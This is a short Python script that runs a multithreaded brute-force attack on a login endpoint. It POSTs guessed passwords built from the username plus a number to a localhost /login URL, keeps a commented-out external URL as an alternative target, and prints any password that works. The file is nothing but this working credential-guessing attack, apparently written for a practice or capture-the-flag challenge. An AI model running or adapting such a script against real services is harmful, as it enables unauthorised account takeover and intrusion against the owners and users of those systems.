import threading
import requests

username = "XAEA-XII"
url = "http://localhost:3000/login"
#url = "https://uww.space.ex/login"
def main(url,username,k):
    for i in range(k,k+11):
        response = requests.post(url,json = {'username':username,'password':f"{username}{i}",'login':"login"}).json()
        if response['success'] == True:
            print("Password is "+ f"{username}{i}")

for i in range(10,101,10):
    instant = threading.Thread(target = main,args = (url,username,i))
    instant.start()

